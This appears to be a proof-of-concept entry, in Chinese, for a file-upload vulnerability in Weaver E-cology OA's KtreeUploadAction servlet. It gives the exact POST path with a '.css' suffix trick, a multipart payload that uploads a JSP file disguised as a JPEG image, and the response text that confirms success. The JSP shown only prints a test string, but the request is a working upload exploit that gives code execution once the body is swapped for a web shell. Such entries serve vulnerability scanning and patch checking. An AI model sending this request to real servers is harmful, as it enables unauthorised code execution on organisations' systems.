# 泛微E-cologyKtreeUploadAction存在文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image HTTP/1.1`

**Payload**
```
--ce2c603de19573a853c8facc8cf14425
Content-Disposition: form-data; name="files"; filename="123456.jsp"
Content-Type: image/jpeg
<%out.println("hello2022 ! world2022");%>
--ce2c603de19573a853c8facc8cf14425--
```
- **响应特征**：-1 hello2022